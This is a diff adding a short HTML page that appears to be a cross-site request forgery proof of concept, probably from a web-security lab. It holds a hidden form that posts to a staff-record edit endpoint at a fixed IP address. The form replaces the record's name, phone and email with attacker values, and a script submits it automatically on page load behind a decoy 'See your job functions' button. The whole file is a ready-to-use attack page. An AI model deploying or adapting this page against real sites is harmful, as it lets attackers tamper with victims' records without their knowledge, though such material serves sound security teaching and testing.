@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <form name="csrfForm" action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=12" method="POST">
+        <input type="hidden" name="first_name" value="Alice">
+        <input type="hidden" name="last_name" value="Hacker">
+        <input type="hidden" name="phone" value="secret">
+        <input type="hidden" name="email" value="hacker@gmail.com">
+        <input type="submit" value="See your job functions">
+    </form>
+    <script>
+        document.csrfForm.submit();
+    </script>
+</body>
+
+</html>
